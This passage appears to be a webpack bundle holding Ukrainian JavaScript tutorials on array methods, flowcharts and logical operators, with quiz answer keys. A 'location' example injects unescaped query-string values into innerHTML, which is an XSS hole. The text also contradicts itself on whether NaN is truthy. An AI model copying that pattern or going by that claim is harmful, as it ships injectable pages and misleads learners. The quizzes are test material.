__proto__: Array(0)\n~~~\n\nМи отримали масив, елементи якого є масивами.\n\nТепер застосуємо метод **~flatMap~** до масиву:\n\n~~~js\nconsole.log(cookie.split('; ').flatMap(item => item.split('='))\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n► (6) [\"name\", \"user\", \"token\", \"Jd7-js15/84\", \"interest\", \"javascript\"]\n~~~\n\nМи отримали \"плоский\" масив.\n\nОтже, використовуючи ту саму функцію:\n\n~~~js\nfunction (item) {\n  return item.split('=')\n}\n~~~\n\nми отримали в першому випадку масив масивів, а в другому - \"плоский\" масив.\n\n____________________________________________________\n\n## ![ico-25 icon] keys()\n\n**Генератор**.\n**Повертає об’єкт _ітератора_**.\n\n◘◘![ico-20 cap] **keys**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n  .split('; ')\n  .map(item => item.split('='))\n\nconst iterator = cookie.keys()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(cookie[value][0], cookie[value][1])\n} while (!done)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\nname user\ntoken Jd7-js15/84\ninterest javascript\n~~~\n\n\n______________________\n\n## ![ico-25 icon] values()\n\n**Генератор**.\n**Повертає об’єкт _ітератора_**.\n\n◘◘![ico-20 cap] **values**◘◘\n\n~~~js\nconst cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n\nconst iterator = cookie\n  .split ('; ')\n  .map(item => item.split('='))\n  .values()\n\ndo {\n  var { value, done } = iterator.next()\n  done || console.log(value)\n} while (!done)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n► (2) [\"name\", \"user\"]\n► (2) [\"token\", \"Jd7-js15/84\"]\n► (2) [\"inerest\", \"javascript\"]\n~~~\n\n_____________________________________________\n\n## ![ico-30 icon] Приклади та тести\n\n_________________________________________\n\n### ![ico-25 cap] Сума кешу на картах\n\nСтворимо масив банківських карток, і за допомогою методу **~reduce~** порахуємо суму коштів на всіх картках:\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.reduce((result, card) => result + card.cash, 0)  // 10300\n~~~\n\n___________________________________________________\n\nСтворимо нову карту, на яку акумулюємо залишки на рахунках усіх карток:\n\n~~~js\ncards.reduce((result, card) => ({\n  num: result.num,\n  cash: result.cash + card.cash\n}), { num: '457855155', cash: 0 })\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ { num: \"457855155\", cash: 10300 }\n    cash: 10300\n    num: \"457855155\"\n  ► __proto__: Object\n~~~\n\nДля чистоти результату додатково обнулимо залишки на рахунках інших карток:\n\n~~~js\ncards.reduce((result, card) => {\n  const cash = card.cash\n  card.cash = 0\n  return {\n    num: result.num,\n    cash: result.cash + cash\n  }\n}, { num: '457855155', cash: 0 })\n~~~\n\nТепер вихідний масив карток буде:\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n\n▼ (4) [{…}, {…}, {…}, {…}]\n  ► 0: {num: \"457892425\", cash: 0}\n  ► 1: {num: \"457812840\", cash: 0}\n  ► 2: {num: \"457855780\", cash: 0}\n  ► 3: {num: \"457811714\", cash: 0}\n    length: 4\n  ► __proto__: Array(0)\n\n~~~\n\n__________________________________________\n\n### ![ico-25 cap] Чищення від дублів\n\nПрипустимо, що у нас є масив користувачів, і ми вирішили отримати масив всіх спеціальностей, які є у цих користувачів.\n~~~js\nconst users = [\n  { name: 'Watson Armstrong', speciality: 'developer' },\n  { name: 'Marcelo Anthony', speciality: 'doctor' },\n  { name: 'Eva Randall', speciality: 'teacher' },\n  { name: 'Stephen Meyer', speciality: 'worker' },\n  { name: 'Isabella Drake', speciality: 'teacher' },\n  { name: 'Rafael Gilbert', speciality: 'developer' },\n  { name: 'Adrianna Schultz', speciality: 'doctor' },\n  { name: 'Kira Hall', speciality: 'teacher' },\n  { name: 'Carmen Duarte', speciality: 'musician' },\n  { name: 'Anika Burton', speciality: 'developer' },\n  { name: 'Hugo Gray', speciality: 'worker' },\n  { name: 'Scott Hahn', speciality: 'worker' }\n]\n\nconst specialities = users.map(user => user.speciality)\n~~~\n\nОднак, як ми бачимо, багато спеціальностей дублюватимуться, що нам абсолютно не потрібно.\n\n◘◘**^^specialities^^**◘◘\n~~~console\n▼ [...]\n   0: \"developer\"\n   1: \"doctor\"\n   2: \"teacher\"\n   3: \"worker\"\n   4: \"teacher\"\n   5: \"developer\"\n   6: \"doctor\"\n   7: \"teacher\"\n   8: \"musician\"\n   9: \"developer\"\n  10: \"worker\"\n  11: \"worker\"\n  length: 12\n  ► [[Prototype]]: Array(0)\n~~~\n\nПотрібно видалити елементи масиву **~specialities~**, що дублюються.\n\n![ico-20 warn] Відразу зауважимо, що найпростіше досягти цього за допомогою конструктора **~Set~**:\n\n~~~js\nArray.from(new Set(specialities))\n~~~\n\nАле ми вирішили піти складнішим шляхом ![ico-25 wink].\n\n~~~js\nconst arr = [\n  'google',\n  'mozilla',\n  'ie',\n  'mozilla',\n  'mozilla',\n  'google',\n  'mozilla',\n  'ie',\n  'ie',\n  'google'\n]\n~~~\n\n~~~js\narr.reduce((result, item) => {\n  result.indexOf(item) < 0 ? result.push(item) : null\n  return result\n}, [])\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (3) [\"google\", \"mozilla\", \"ie\"]\n    0: \"google\"\n    1: \"mozilla\"\n    2: \"ie\"\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n_________________________________________________\n\n### ![ico-25 cap] Число відрізків в інтервалі\n\nЄ кілька відрізків на числовій осі:\n\n~~~js\nconst intervals = [[10, 20], [4, 18], [7, 10], [5, 16], [9, 13], [11, 15], [7, 15], [10, 12], [12, 19]]\n~~~\n\nДля кожного відрізка слід порахувати, скільки відрізків виявилося всередині нього.\n\nДля спрощення коду додамо в прототип конструктора **~Array~** метод **~testSegment~**:\n~~~js\nArray.prototype.interior = function (interval = [0, 1]) {\n  return this[0] < interval[0] && this[1] > interval[1]\n}\n~~~\nТепер можна порівняти два відрізки просто:\n~~~js\n[18, 35].interior([4, 18]) // false\n[18, 35].interior([20, 28]) // true\n~~~\nТепер ми можемо виконати поставлене завдання:\n~~~js\nintervals\n  .map((segment, index, array) => array.filter(interval => segment.interior(interval)).length)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n► (9) [2, 6, 0, 5, 1, 0, 2, 0, 0]\n~~~\n\n__________________________\n\n### ![ico-25 cap] Перевірка парних дужок\n\nЗавдання: перевірити парність та правильність розміщення дужок.\n\nНаприклад, валідація рядка \"({})[([])]\" має пройти нормально (повернути ~true~),\nа валідація рядка \"({(})[([)])]\" має повернути ~false~.\n\nДля зручності використання створимо успадкований метод рядків:\n\n◘◘![ico-20 cap] **Brackets validation**◘◘\n\n~~~js\nString.prototype.testBrackets = (function () {\n  const brackets = {\n    '[': ']',\n    '{': '}',\n    '(': ')'\n  }\n\n  const all = ['[', '{', '(', ']', '}', ')']\n\n  return function () {\n    const self = this\n      .split('')\n      .filter(char => all.includes(char))\n\n    let stack = [], result = ''\n\n    self\n      .forEach(symbol => {\n        if (!brackets[symbol] && stack.length === 0) return false\n\n        brackets[symbol] ? stack.push(symbol) : symbol = brackets[stack.pop()]\n\n        result += symbol\n      })\n\n    return result === self.join('') && stack.length === 0\n  }\n})()\n~~~\n\n~~~js\n'( [ ( { ( ( {(} ([]) ) ) } ) ] )'.testBrackets()   // false\n\nString.prototype.testBrackets.toString().testBrackets()  // true\n~~~\n\n{{{Array-iteration-methods-brackets.js}}}\n___________________________________________________\n\n### ![ico-25 cap] location\n\n~~~js\nfunction getSearchObject () {\n  const obj = {}\n\n  location.search\n    .slice(1)\n    .split(',')\n    .map(x => x.split('='))\n    .map(function (item) { this[item[0]] = item[1] }, obj)\n\n    return obj\n}\n\nvar searchObject = getSearchObject ()\nfor (const rec in searchObject) {\n  document.body.innerHTML += `<p>${rec}: ${searchObject[rec]}</p>`\n}\n~~~\n\n[:::**Live demo**:::](samples/11)\n\n_____________________________________________\n\n### ![ico-25 cap] getComputedStyle\n\nПерейдіть за [**_посиланням_**](https://en.wikipedia.org/wiki/Idempotence ) і в консолі сторінки виконайте код:\n\n~~~js\nArray.from(document.getElementsByClassName('interlanguage-link'))\n  .map(item => getComputedStyle(item))\n  .forEach(item => console.log(item['font-family']))\n~~~\n\n________________________________________________\n\n[![ico-30 hw] **Тесты**](quiz/arrayIterationMethods)\n"},2598:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 icon] Блок-схема алгоритму\n\n______________________________________________________________________\n\n## ![ico-25 icon] Алгоритм\n\nВ основі структурного програмування лежить тріада:\n\n• **Послідовність** - виконання дій одна за одною.\n• **Перемикання** - вибір дії залежно від виконання умови.\n• **Цикл** - неодноразове повторення однієї й тієї самої послідовності дій.\n\n\nПрограмування починається з _опису алгоритму_.\n\n**Алгоритм** - це покрокова система інструкцій, що визначають процес переходу від вихідних даних (на вході) до шуканого результату (на виході).\n\n| **~Вхід~** | ** ➔** | **~Процес~** | ** ➔** | **~Вихід~** |\n\nЯкщо результат існує, алгоритм виконується за кінцеве число кроків.\n\nЯкщо шуканого результату не існує, алгоритм або ніколи не завершує роботу, або заходить у глухий кут.\n\nІноді алгорим досить простий, і ви його тримаєте в голові, коли пиляєте скрипт.\n\nАле іноді він буває настільки складним, що ви хочете візуалізувати його, щоб нічого не забути і не переплутати.\n\nОдним зі способів опису алгоритму є **блок-схема**.\n\n\n________________________________________________________________________________\n\n## ![ico-25 icon] Блок-схема\n\nБлок-схеми є незамінними інструментами для візуалізації складних процесів.\n\nДля того, щоб якийсь процес зобразити схематично, нам потрібні певні графічні форми.\n\nНайпростішими з таких форм є:\n\n@@@@ 1\n![](illustrations/flowchart-symbols.svg)\n@@@@\n\nАлгоритм повинен мати початок і кінець.\n\nПерехід від однієї дії до іншої зображується стрілками.\n\nБлок операцій - прямокутник - дозволяє вам використовувати різний рівень деталізації. В один такий блок можна вписати одразу цілу послідовність простих дій, а можна кожну таку просту дію помістити в окремий блок.\n\n<div class="flowchart-endpoints">Begin<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Взяти штани<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Почистити штани<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Пришити ґудзик<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Попрасувати штани<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Одягти штани<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-endpoints">End<div>\n\n_______________________________________________________\n\nКожен із блоків «Почистити штани» або «Пришити ґудзик» можна розгорнути в окрему послідовність дій.\n\nМожна переставити місцями блоки «Почистити штани» і «Пришити ґудзик», однак точно не варто змінювати положення блоку «Одягти штани», оскільки в цьому випадку всі інші операції значно ускладняться.\n\n_______________________________________________________\n\n^^Для малювання блок-схеми можна скористатися^^ [^^**безкоштовним сервісом**^^ ![ico-25 draw-io]](https://www.draw.io/)\n\n_______________________________________________________\n\n### ![ico-20 icon] Послідовність\n\nМожливо, ви не усвідомлюєте цього, але все ваше життя - це процес, який полягає в певній послідовності дій.\n\nВранці ви встаєте, потім йдете у ванну кімнату, потім (найімовірніше) - на кухню, де готуєте собі каву, тощо.\n\nПеред виходом на роботу ви одягаєтеся.\n\nНапевно, було б дивно, якби ви вийшли на вулицю просто з душу. Хоча всяке трапляється ![ico-25 wink].\n\nТобто якщо у вашій послідовності дій прибрати якусь ланку, або переставити місцями дві окремі операції, то результат може бути дуже неприємним.\n\nПрипустимо, ви робите собі чай, п\'єте його, і тільки потім накладаєте в чашку цукор. Думаю, ви пили несолодкий чай. Додавання цукру після чаювання ситуацію явно не виправить.\n\nОтже, послідовність дій дуже важлива.\n\nКоли ви пишете програму, ви задаєте комп\'ютеру чітку послідовність дій.\n\nЦю послідовність можна зобразити схематично у вигляді блок-схеми:\n\n\n\n@@@@ 1\n![](illustrations/flowchart-sequence.svg)\n@@@@\n\nЯк бачите, суворо виконується напрямок зверху вниз.\nТільки після завершення попередньої операції починається наступна.\n\n_______________________________________________________\n\n### ![ico-20 icon] Гілкування\n\nДуже часто ми змушені приймати рішення, що робити.\nЯкщо вам затримують виплату зарплати, ви не можете зробити заплановану покупку.\nОтримання зарплати - умова, якщо її виконано - ви можете купувати те, що запланували.\n\nВаш код оперуватиме даними, які динамічно змінюються.\nЗалежно від значення якихось даних ваш код виконуватиме різні операції.\nНаприклад, юзер відкрив ваш застосунок.\nВін міг зареєструватися, авторизуватися або увійти як незареєстрований користувач.\nЯкщо це зареєстрований користувач, то він може увійти в персональний кабінет.\nВ іншому разі такої можливості в нього немає.\n\n@@@@ 1\n![](illustrations/flowchart-branching.svg)\n@@@@\n\n_______________________________________________________\n\n### ![ico-20 icon] Цикл\n\nПовторення однієї і тієї ж послідовності дій кілька разів - це цикл.\n\nМиття посуду вручну - це цикл (тарілка за тарілкою, чашка за чашкою - поки весь посуд не буде вимито).\n\nХодьба - це цикл: піднімається ліва нога, виноситься вперед, опускається, ви переносите вагу тіла на ліву ногу і піднімаєте праву, яка так само виноситься вперед і опускається, і так доти, доки ви не прийдете до точки призначення або вам не набридне виконувати ці вправи.\n\nНа блок-схемі алгоритму цикл матиме приблизно такий вигляд:\n\n@@@@ 1\n![](illustrations/flowchart-circle.svg)\n@@@@\n\nЯк бачите, є якась умова, виконання якої перевіряється на кожній **ітерації** циклу.\nТобто якби ми не використовували вище розглянуте **гілкування**, то цикл крутився б нескінченно, що абсолютно неприпустимо.\n\n_______________________________________________________\n\n\n![ico-20 hw] **Вправа 1**\n\n^^Намалюйте блок-схему алгоритму підсумовування всіх цілих чисел від 1 до **~ N~**.^^\n\n![ico-20 hw] **Вправа 2**\n\n^^Намалюйте блок-схему алгоритму підсумовування всіх цілих непарних чисел від 1 до **~ N~**.^^\n\n__________________________________________________________________\n\n### ![ico-25 cap] Ряд Фібоначчі\n\n^^Ряд Фібоначчі - це послідовність чисел, кожне з яких дорівнює сумі двох попередніх.^^\n\n^^Перший і другий члени ряду Фібоначчі дорівнюють 1.^^\n\n**Схема алгоритму обчислення члена ряду Фібоначчі за його номером ~ N~**:\n\n@@@@ 1\n![](illustrations/flowchart-fibonachi.svg)\n@@@@\n\n_______________________________________________________\n\n![ico-20 hw] **Вправа 3**\n\n^^Змініть блок-схему алгоритму обчислення члена ряду Фібоначчі за його номером **~ N~** наступним чином:^^\n\n^^• змініть стартові значення змінних;^^\n^^• перенесіть інкремент (приріст) змінної **~n ~** перед блоком розгалуження коду (де порівнюються **~n ~** і **~ N~**).^^\n\n~~~js\n  n = 1\n  a = 1\n  b = 1\n  F = 1   \n  n = n + 1\n  ...\n~~~\n\n_______________________________________________________\n\n![ico-20 hw] **Вправа 4**\n\n^^Намалюйте блок-схему алгоритму обчислення факторіалу числа **~ N~**.^^\n\n^^**Факторіал** числа **~ N~** - це добуток усіх чисел від 1 до **~ N~**.^^\n\n~~~js\nN! = 1 * 2 * 3 * 4 * .... * N\n~~~\n'},93895:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Логічні конструкції JS\n\nУ цьому розділі ми познайомимося з логічними значеннями, логічними змінними, логічними виразами та логічними операторами.\n\n## ![ico-30 icon] Змінні логічного типу (boolean)\n\nКоли людина заявляє, що її синові 18 років, то цей вираз буде правдою протягом одного року, а до цього року і після цього року цей вираз стане брехнею. І то за умови, що в цієї людини є син.\n\n![](illustrations/logical-expressions.svg)\n\nПрипустимо, що це твердження людина написала на своїй сторінці в соціальних мережах, коли їй було 15 років.\nУ нього ще не було сина, і це твердження було брехнею.\nПотім чоловік подорослішав, одружився і в нього народився син, але це твердження залишалося неправдою, тому що його синові ще не було 18 років.\nНарешті, коли його синові виповнилося 18, це твердження стало істиною.\nАле це тривало один рік.\nПотім його синові виповнилося 19, і це твердження знову стало хибним.\n\nТаким чином, це твердження є **змінною**. Адже його значення може змінюватися.\nЗначення, які може набувати ця змінна, - «істина» (**~true~**) або «брехня» (**~false~**).\n\n**~true~** і **~false~** - це **логічні значення**.\n![ico-25 warn] **Інших логічних значень не існує.**\n^^У нас немає такого лукавого поняття, як «Не все так однозначно». Усе однозначно. Або чорне, або біле. Наш світ простий.^^\n\nОтже, наша змінна може приймати одне з двох можливих логічних значень (**~true~** або **~false~**).\nЦе змінна **логічного типу** (**~boolean~**).\n\n______________________________________\n\n## ![ico-30 icon] Логічні вирази\n\nТвердження '_Яблуко червоне і кругле_' можна розкласти на дві частини: '_Яблуко червоне_' + '_Яблуко кругле_'.\n\n![](illustrations/logical-expressions-1.svg)\n\nТобто фактично ми маємо справу з двома логічними змінними, кожна з яких приймає логічне значення, тобто є змінною логічного типу.\n\n◘◘ ![ico-25 coffee] ** 1**◘◘\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n~~~\n\nНехай логічна змінна **~appleIsRed~** приймає значення **~true~**, коли властивість **~apple.color~** має значення 'red', а логічна змінна **~appleIsRound~** приймає значення **~true~**, коли властивість **~apple.shape~** має значення 'round'.\n\nЗмінна **~appleIsRedAndRound~** приймає значення **~true~**, коли одночасно змінна **~appleIsRed~** приймає значення **~true~** і змінна **~appleIsRound~** приймає значення **~true~**.\n\n| apple.color | apple.shape | appleIsRed | appleIsRound | appleIsRedAndRound |\n|   'red'     |   'round'   |   ~true~   | ~true~       |   ~true~           |\n|   'yellow'  |   'round'   |   ~false~  | ~true~       |   ~false~          |\n|   'red'     |   'square'  |   ~true~   | ~false~      |   ~false~          |\n|   'green'   |   'square'  |   ~false~  | ~false~      |   ~false~          |\n\nТоді змінна **~appleIsRedAndRound~** вже є **логічним виразом**, оскільки вимагає обчислення її значення на основі значень змінних **~appleIsRed~** і **~appleIsRound~**.\n\nІ цей логічний вираз матиме значення **~true~** тільки тоді, коли обидві змінні **~appleIsRed~** і **~appleIsRound~** матимуть значення **~true~**.\n\n**Логічний вираз** - це вираз, у результаті обчислення якого буде отримано логічне значення.\n\nНайпростішим випадком логічного виразу є логічне значення.\n\nДавайте подивимося, як можна побудувати більш складні логічні вирази.\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Оператори порівняння\n\nНайпростіший спосіб побудови логічних виразів - це використання **операторів порівняння**.\nЦе бінарні оператори, тобто вони мають два операнди.\nОперанди можуть бути змінними або виразами.\n\n![ico-25 warn] Оператори порівняння порівнюють не тільки **значення**, а й **типи даних** операндів.\nОператори порівняння завжди повертають **логічне значення**.\n\n| Оператор  | Опис |\n| **~==~**  | нестрога рівність ^^(порівнюються тільки значення операндів, під капотом відбувається приведення типів даних)^^ |\n| **~===~** | сувора рівність ^^(порівнюються типи даних операндів, і якщо тип даних операндів один і той самий, то порівнюються значення операндів)^^ |\n| **~!=~**  | нестрога нерівність ^^(значення не рівні, тип даних ігнорується)^^ |\n| **~!==~** | сувора нерівність ^^(не рівні не тільки значення, а й типи даних)^^ |\n| **~ > ~** | більше              |\n| **~ < ~** | менше               |\n| **~>=~**  | більше або дорівнює |\n| **~<=~**  | менше або дорівнює  |\n\nПорівняння рядків відбувається посимвольно.\nКожен символ має числовий код, і порівнюються коди символів.\nЯкщо перші символи рядків-операндів рівні, то порівнюють наступні символи, і так доти, доки один із символів не виявиться більшим або меншим за другий.\n\n§§§§ Demo | boolean_01_template §§§§\n\n_________________________________________________________________________\n\n### ![ico-30 hw] Тести\n\n◘◘![ico-25 hw]** 1**◘◘\n\n→→→ 5 > '4' | true, false | true→→→\n\n◘◘![ico-25 hw]** 2**◘◘\n\n→→→ 5 !== '5' | true, false | true→→→\n\n◘◘![ico-25 hw]** 3**◘◘\n\n→→→ 10 != '10' | true, false | false→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n\n→→→ true != 1 | true, false | false→→→\n\n◘◘![ico-25 hw]** 5**◘◘\n\n→→→ true !== '1' | true, false, 'Не все так однозначно' | true→→→\n\n◘◘![ico-25 hw]** 6**◘◘\n\n→→→ true <= 1 | true, false | true→→→\n\n◘◘![ico-25 hw]** 7**◘◘\n\n→→→ 'abc' < 'cde' | true, false | true→→→\n\n◘◘![ico-25 hw]** 8**◘◘\n\n→→→ 'Welcome!'.length < 'How are you?'.length | true, false | true→→→\n\n__________________________________________________________________________\n\n## ![ico-30 icon] Логічні оператори\n\nЛогічних операторів у JS три: **логічне множення**, **логічне додавання** і **логічне заперечення**.\n\nОператор **логічного заперечення** - це унарний оператор, тобто він має лише один операнд.\nЛогічні оператори «і» (множення) та «або» (додавання) - це бінарні оператори, у них два операнди.\n\nЛогічне заперечення завжди повертає логічне значення, навіть якщо операнд не є логічним виразом (або логічним значенням).\nОператори **логічного множення**, **логічного додавання** не завжди повертають логічне значення.\n\nПри виконанні логічних операцій під капотом движок приводить операнди до типу даних **~boolean~**.\nЦе називається [►►►**неявне приведення типів**►►►►](page/Implicit-type-conversion).\n\nОскільки приведення до типу **~boolean~** є досить простим, ми можемо трохи «забігти наперед»:\n\n1. Порожній рядок приводиться до **~false~**. Якщо довжина рядка більша за 0, то такий рядок буде приведений до **~true~** незалежно від того, які символи є в цьому рядку.\n2. Числа, відмінні від 0, і **~NaN~**, приводяться до **~true~**, а 0 і **~NaN~** приводяться до **~false~**.\n3. **~null~** і **~undefined~** приводяться до **~false~**.\n4. Будь-які структури даних (масиви, об'єкти) завжди приводяться до **~true~**, незалежно від вмісту цих структур даних або повної відсутності вмісту.\n\n_____________________________________________\n\n### ![ico-25 icon] Оператор заперечення\n\nТвердження «Яблуко не червоне» є запереченням твердження «Яблуко червоне».\nТобто яблуко може бути будь-якого кольору, тільки не червоного.\nЯкщо повернутися до прикладу 1:\n\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n\nvar appleIsRed = apple.color === 'red'\nvar appleIsRound = apple.shape === 'round'\n~~~\n\nто нова змінна логічного типу **~appleIsNotRed~** може бути обчислена на підставі значення змінної **~appleIsRed~** шляхом заперечення.\n\nДля логічного заперечення в JS використовується символ **~ !~** (знак оклику):\n\n~~~js\nvar appleIsNotRed = !appleIsRed\n~~~\n\n![ico-25 warn] Логічне заперечення завжди повертає **логічне значення** незалежно від типу даних операнда.\nТобто яким би не був тип даних операнда, оператор **~ !~** завжди поверне **~true~** або **~false~**.\n\n◘◘![ico-25 coffee] ** 2**◘◘\n\n~~~js\n!(5 > 8)    // true\n\n// explanation:\n\n5 > 8      // false,\n!false     // true\n~~~\n\n◘◘![ico-25 coffee] ** 3**◘◘\n\n~~~js\n!(5 > 4)   // false\n\n// explanation:\n\n5 > 4      // true,\n!true      // false\n~~~\n\n§§§§ Demo | boolean_02_template §§§§\n\n____________________________________________________________\n\n### ![ico-25 icon] Логічне множення\n\nСинтаксис: ~operand1 **&&** operand2~\n\nПовернемося до прикладу 1:\n\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n\nvar appleIsRed = apple.color === 'red'\nvar appleIsRound = apple.shape === 'round'\n~~~\n\nЯкщо обидва операнди є логічними виразами (або логічними змінними), то результат матиме тип даних **~boolean~**.\n\n~~~js\nvar appleIsRedAndRound = appleIsRed && appleIsRound\n~~~\n\n§§§§ Demo | boolean_03_template §§§§\n\nУ наступних прикладах ми використовуємо логічний оператор **~&&~** до операндів, які є **логічними виразами**.\nЛогічні вирази ми будуємо за допомогою операторів порівняння.\n\n◘◘![ico-25 coffee] ** 4**◘◘\n\n~~~js\n5 > 8 && 4 < 5   // false  \n// explanation:\n5 > 8            // false\n4 < 5            // true\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 5**◘◘\n\n~~~js\n8 < 5 && 4 < 5   // false\n// explanation:\n8 > 5            // false\n4 < 5            // true\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 6**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx > y && z < y   // false\n// explanation:\nx > y            // false,\nz < y            // true,\nfalse && true    // false\n~~~\n\n◘◘![ico-25 coffee] ** 7**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx < y && z < y   // true\n// explanation:\nx < y            // true,\nz < y            // true,\ntrue && true     // true\n~~~\n\nОднак це JS, і ми можемо застосовувати логічні оператори до даних будь-якого типу.\nУ цьому випадку починає працювати [►►►**неявне приведення типів**►►►►](page/Implicit-type-conversion), тобто операнди приводяться до логічного типу, після чого обчислюється значення виразу в такий спосіб: якщо після приведення першого операнда до логічного типу даних буде отримано значення ~false~, то повертається значення першого операнда, в іншому разі повертається значення другого операнда.\n\n§§§§ Demo | boolean_04_template §§§§\n\nДля більш складних виразів:\n\n![](illustrations/logical-operators.svg)\n\nЗверніть увагу на той факт, що використання логічного оператора **~&&~** не визначає однозначно тип результату.\nТип даних значення, яке буде отримано движком у результаті обчислення виразу, залежить від типу даних операндів.\n\n§§§§ Demo | boolean_05_template §§§§\n\n_________________________________________________\n\n### ![ico-25 icon] Логічне складання\n\nСинтаксис: ~operand1 **◧** operand2~\n\n§§§§ Demo | boolean_06_template §§§§\n\n◘◘![ico-25 coffee] ** 8**◘◘\n\n~~~js\n5 > 8 || 4 < 5   // true\n\n// explanation:\n\n5 > 8            // false,\n4 < 5            // true,\nfalse || true    // true\n~~~\n\n◘◘![ico-25 coffee] ** 9**◘◘\n\n~~~js\n5 > 8 || 4 > 5   // false\n\n// explanation:\n\n5 > 8            // false,\n4 > 5            // false,\nfalse || false   // false\n~~~\n\n◘◘![ico-25 coffee] **10**◘◘\n\n~~~js\nvar x = 4, y = 10, z = 8\n\nx > y || z < y   // true\n\n// explanation:\n\nx > y            // false,\nz < y            // true,\nfalse || true    // true\n~~~\n\n◘◘![ico-25 coffee] **11**◘◘\n\n~~~js\nx > y || z > y   // false\n\n// explanation:\n\nx > y            // false,\nz > y            // false,\nfalse || false   // false\n~~~\n\nОтже, логічне складання працює за принципом: якщо після приведення до типу даних **~boolean~** **хоч би одного з операндів** буде отримано **~true~**, то весь вираз матиме значення **~true~**. Оскільки значення інших операндів уже не змінять результат, то движок зупиняється на першому ж операнді, який після приведення типів дасть **~true~**. Однак оператор **~◧~** повертає не **~true~**, а початкове значення операнда.\n\n![](illustrations/logical-operators-1.svg)\n\n◘◘![ico-25 coffee] **12**◘◘\n\n~~~js\nvar object = {\n  color: 'yellow',\n  shape: 'square',\n  size: 100\n}\n\nvar test = object.color === 'red' || object.shape === 'circle' || object.size > 50\n~~~\n\n~~~console\ntrue\n~~~\n_________________________________________________________________________\n\n![ico-25 exclamation] Незалежно від типу даних і значення змінної **~test~**:\n\n~~~js\n!test || !!test    // завжди  true\n\n!test && !!test    // завжди  false\n~~~\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Tests\n\n◘◘![ico-25 hw] ** 1**◘◘\n\n~~~js\nvar x = undefined\n~~~\n\n→→→ x ◧ !x | undefined, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 2**◘◘\n\n~~~js\nvar x = undefined\n~~~\n\n→→→ x && !x | undefined, null, true, false | undefined →→→\n\n◘◘![ico-25 hw] ** 3**◘◘\n\n~~~js\nvar x = null\n~~~\n\n→→→ x ◧ !x | undefined, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 4**◘◘\n\n~~~js\nvar x = null\n~~~\n\n→→→ x && !x | undefined, null, true, false | null →→→\n\n◘◘![ico-25 hw] ** 5**◘◘\n\n~~~js\nvar x = NaN\n~~~\n\n→→→ x ◧ !x | NaN, null, true, false | true →→→\n\n◘◘![ico-25 hw] ** 6**◘◘\n\n~~~js\nvar x = NaN\n~~~\n\n→→→ x && !x | NaN, null, true, false | NaN →→→\n\n◘◘![ico-25 hw] ** 7**◘◘\n\n~~~js\nvar x = 5\n~~~\n\n→→→ x ◧ !x | NaN, null, 5, true, false | 5 →→→\n\n◘◘![ico-25 hw] ** 8**◘◘\n\n~~~js\nvar x = 5\n~~~\n\n→→→ x && !x | NaN, null, 5, true, false | false →→→\n\n\n◘◘![ico-25 hw] ** 9**◘◘\n\n~~~js\nvar x = 'Hi!'\n~~~\n\n→→→ x ◧ !x | undefined, 'Hi!', true, false | Hi! →→→\n\n\n◘◘![ico-25 hw] **10**◘◘\n\n~~~js\nvar x = 'Hi!'\n~~~\n\n→→→ x && !x | undefined, 'Hi!', true, false | false →→→\n\n◘◘![ico-25 hw] **11**◘◘\n\n~~~js\nvar x = ''\n~~~\n\n→→→ x ◧ !x | undefined, '\"\"', true, false | true →→→\n\n\n◘◘![ico-25 hw] **12**◘◘\n\n~~~js\nvar x = ''\n~~~\n\n→→→ x && !x | undefined, '\"\"', true, false | \"\" →→→\n\n\n◘◘![ico-25 hw] **13**◘◘\n\n~~~js\nvar x = 4, y = 10\n~~~\n\n→→→ (x > y) ◧ (x < 5) | 4, 10, true, false | true →→→\n\n\n◘◘![ico-25 hw] **14**◘◘\n\n~~~js\nvar x = 4, y = 10\n~~~\n\n→→→ (x > y) && (x < 5) | 4, 10, true, false | false →→→\n\n\n◘◘![ico-25 hw] **15**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length && students[1] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | Anna →→→\n\n\n◘◘![ico-25 hw] **16**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 'Josef']\n~~~\n\n→→→ students.length ◧ students[2] | 4, 'Piter', 'Anna', 'Demid', 'Josef', true, false | 4 →→→\n\n\n◘◘![ico-25 hw] **17**◘◘\n\n~~~js\nvar students = ['Piter', 'Anna', 'Demid', 